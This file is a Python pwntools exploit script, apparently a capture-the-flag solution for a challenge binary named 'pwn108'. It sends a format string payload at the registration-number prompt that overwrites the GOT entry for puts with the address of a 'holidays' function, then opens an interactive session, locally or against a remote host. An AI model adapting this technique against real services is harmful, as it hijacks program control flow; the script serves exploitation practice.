from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "pwn108.pwn108"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"=[Your name]:", b"dimas")
        p.sendlineafter(b"=[Your Reg No]:", content)
        

x, p = init()

payload = b"" 
payload += fmtstr_payload(10, {exe.got['puts']: exe.sym['holidays']})

x.debug("b *main+250\nc")
x.send(payload)
p.interactive()